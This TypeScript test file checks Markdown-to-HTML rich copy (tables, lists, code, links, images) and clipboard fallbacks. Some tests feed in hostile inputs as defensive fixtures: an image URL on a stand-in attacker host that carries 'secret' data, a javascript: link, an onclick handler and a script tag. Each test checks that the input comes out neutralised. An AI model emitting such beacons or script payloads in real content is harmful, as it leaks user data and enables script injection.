// Copying an answer with its formatting (lib/richCopy.tsx, lib/clipboard.ts): the HTML a paste into Gmail, Outlook,
// Word or Google Docs gets, and that both flavours reach the clipboard on every path.
import { describe, expect, test } from 'bun:test'
import { renderToStaticMarkup } from 'react-dom/server'
import { answerHtml } from '../../src/lib/richCopy'
import { writeRich } from '../../src/lib/clipboard'

const ORIGIN = 'https://team.example.com'
const html = (md: string) => answerHtml(md, ORIGIN, renderToStaticMarkup)

describe('answer HTML', () => {
  test('a Markdown table becomes a real bordered table with header cells and column alignment', () => {
    const out = html('| name | value |\n|---|--:|\n| alpha | 1 |\n| **beta** | 2 |')
    expect(out).toContain('<table border="1"')
    expect(out).toContain('border-collapse:collapse')
    expect(out).toMatch(/<thead><tr><th style="[^"]*border:1px solid #d0d7de[^"]*">name<\/th>/)
    expect(out).toMatch(/<td style="[^"]*text-align:right[^"]*">1<\/td>/)
    expect(out).toContain('<td style="border:1px solid #d0d7de;padding:4px 8px;vertical-align:top;text-align:left"><strong>beta</strong></td>')
    expect(out).toContain('</tbody></table>')
  })

  test('headings, bold, italics, strikethrough, lists, task lists, quotes and rules', () => {
    const out = html('## 요약\n\n각 일정을 **마일스톤(◆)**으로 *표시*하고 ~~취소~~\n\n- one\n- two\n\n1. first\n2. second\n\n- [x] done\n- [ ] todo\n\n> quoted\n\n---')
    expect(out).toContain('<h2>요약</h2>')
    expect(out).toContain('<strong>마일스톤(◆)</strong>으로')
    expect(out).toContain('<em>표시</em>')
    expect(out).toContain('<del>취소</del>')
    expect(out).toContain('<ul>\n<li>one</li>\n<li>two</li>\n</ul>')
    expect(out).toContain('<ol>\n<li>first</li>')
    expect(out).toContain('☑ done')
    expect(out).toContain('☐ todo')
    expect(out).not.toContain('<input')
    expect(out).toMatch(/<blockquote style="[^"]*border-left:3px solid #d0d7de[^"]*">/)
    expect(out).toContain('<hr/>')
  })

  test('code blocks keep their text in a grey monospace block; inline code and math stay as source', () => {
    const out = html('```python\nprint("<hi>")\n```\n\nRun `npm test`. Math: $x^2 + 1$ and a price of $5.\n\n```mermaid\ngraph TD; A-->B\n```')
    expect(out).toMatch(/<pre style="[^"]*font-family:Menlo[^"]*white-space:pre-wrap[^"]*"><code>print\(&quot;&lt;hi&gt;&quot;\)<\/code><\/pre>/)
    expect(out).toMatch(/<code style="[^"]*">npm test<\/code>/)
    expect(out).toMatch(/<code style="[^"]*">x\^2 \+ 1<\/code>/)
    expect(out).toContain('a price of $5.')
    expect(out).toContain('<code>graph TD; A--&gt;B</code>')
    expect(out).not.toContain('katex')
    expect(out).not.toContain('<svg')
  })

  test('links: external kept, team files and app links absolute, unsafe ones plain text', () => {
    const out = html('[docs](https://example.com/a?b=1) [plan](/api/files/download?path=marketing%2Fplan.md) [view](/files/view?path=shared%2Fa%20(1).md) [chat](/c/abc) [x](javascript:alert(1)) [note](#fn-1)')
    expect(out).toContain('<a href="https://example.com/a?b=1">docs</a>')
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=marketing%2Fplan.md">plan</a>`)
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=shared%2Fa%20%281%29.md">view</a>`)
    expect(out).toContain(`<a href="${ORIGIN}/c/abc">chat</a>`)
    expect(out).not.toContain('javascript:')
    expect(out).toContain(' x ')
    expect(out).toContain(' note')
  })

  test('team-file links keep every query parameter the link had: page, sheet and range, slide and any other', () => {
    const out = html(
      '[p.12](/files/view?path=docs%2Freport.pdf&page=12) [매출](/files/view?path=fin%2Fq3.xlsx&sheet=%EB%A7%A4%EC%B6%9C&range=A12:F12) [s3](/files/view?path=deck.pptx&slide=3&from=answer) [dl](/api/files/download?path=docs%2Fa.pdf&page=2&disposition=attachment)',
    )
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=docs%2Freport.pdf&amp;page=12">p.12</a>`)
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=fin%2Fq3.xlsx&amp;sheet=%EB%A7%A4%EC%B6%9C&amp;range=A12:F12">매출</a>`)
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=deck.pptx&amp;slide=3&amp;from=answer">s3</a>`)
    // a download link becomes the preview, at the same page; its own disposition is not part of the preview
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=docs%2Fa.pdf&amp;page=2">dl</a>`)
  })

  test('nothing loads by itself where it is pasted: external and team images become links', () => {
    const out = html('![chart](https://evil.example/collect?d=secret)\n\n![](/api/files/download?path=shared%2Fchart.png)\n\n![dot](data:image/png;base64,iVBORw0KGgo=)')
    expect(out).not.toMatch(/<img[^>]*evil\.example/)
    expect(out).toContain('<a href="https://evil.example/collect?d=secret">chart</a>')
    expect(out).toContain(`<a href="${ORIGIN}/files/view?path=shared%2Fchart.png">chart.png</a>`)
    expect(out).toContain('<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot"')
    expect(out.match(/<img/g)?.length).toBe(1)
  })

  test('raw HTML stays text and hidden comments stay hidden, as on the screen', () => {
    const out = html('before <b onclick="x()">bold?</b>\n\n<script>alert(1)</script>\n\n<!-- secret note -->after')
    expect(out).not.toContain('<script')
    expect(out).not.toContain('<b ')
    expect(out).toContain('&lt;script&gt;alert(1)&lt;/script&gt;')
    expect(out).not.toContain('secret note')
    expect(out).toContain('after')
  })
})

describe('writeRich: both flavours on the clipboard', () => {
  class FakeItem {
    constructor(readonly items: Record<string, Blob>) {}
  }
  const data = { html: '<table><tr><td>a</td></tr></table>', plain: '| a |' }

  test('the async clipboard gets text/html and text/plain in one item', async () => {
    const written: FakeItem[][] = []
    const ok = await writeRich(data, { clipboard: { write: async (items) => { written.push(items as unknown as FakeItem[]) }, writeText: async () => { throw new Error('not this') } }, ClipboardItem: FakeItem as never, copyEvent: () => { throw new Error('not this') } })
    expect(ok).toBe(true)
    expect(written).toHaveLength(1)
    const item = written[0]![0]!
    expect(Object.keys(item.items).sort()).toEqual(['text/html', 'text/plain'])
    expect(await item.items['text/html']!.text()).toBe(data.html)
    expect(item.items['text/html']!.type).toStartWith('text/html')
    expect(await item.items['text/plain']!.text()).toBe(data.plain)
  })

  test('without the async clipboard (plain http): the copy command carries both', async () => {
    let got: typeof data | null = null
    const ok = await writeRich(data, { clipboard: null, ClipboardItem: null, copyEvent: (d) => { got = d; return true } })
    expect(ok).toBe(true)
    expect(got!).toEqual(data)
  })

  test('a refused clipboard.write falls back to the copy command, then to the plain text', async () => {
    let event = 0
    const plain: string[] = []
    const clipboard = { write: async () => { throw new Error('NotAllowedError') }, writeText: async (t: string) => { plain.push(t) } }
    expect(await writeRich(data, { clipboard, ClipboardItem: FakeItem as never, copyEvent: () => { event++; return true } })).toBe(true)
    expect(event).toBe(1)
    expect(plain).toEqual([])
    expect(await writeRich(data, { clipboard, ClipboardItem: FakeItem as never, copyEvent: () => false })).toBe(true)
    expect(plain).toEqual([data.plain])
    expect(await writeRich(data, { clipboard: null, ClipboardItem: null, copyEvent: () => false })).toBe(false)
  })
})
